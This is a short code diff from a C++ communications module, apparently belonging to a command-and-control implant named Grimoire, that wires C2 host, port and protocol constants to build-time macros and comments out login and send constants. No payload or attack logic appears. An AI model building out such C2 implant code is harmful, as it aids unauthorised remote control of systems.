@@ -6,18 +6,18 @@
 #include "Utils.hpp"
 #include <iostream>
 #include <sstream>
-#include "nlohmann/json.hpp"
+#include <nlohmann/json.hpp>
 #include <stdexcept>
 #include <algorithm>
 #include <utility>
 
 namespace Grimoire::Comms {
 
-    extern const std::string Grimoire_C2_HOST;
-    extern const std::string Grimoire_C2_PORT;
-    extern const std::string Grimoire_C2_PROTOCOL;
-    extern const std::string Grimoire_C2_LOGIN;
-    extern const std::string Grimoire_C2_SEND;
+    extern const std::string Grimoire_C2_HOST = GRIMOIRE_C2_HOST;
+    extern const std::string Grimoire_C2_PORT = GRIMOIRE_C2_PORT;
+    extern const std::string Grimoire_C2_PROTOCOL = GRIMOIRE_C2_PROTOCOL;
+    // extern const std::string Grimoire_C2_LOGIN;
+    // extern const std::string Grimoire_C2_SEND;
     using json = nlohmann::json;
     // --- 静态回调函数实现 ---
 
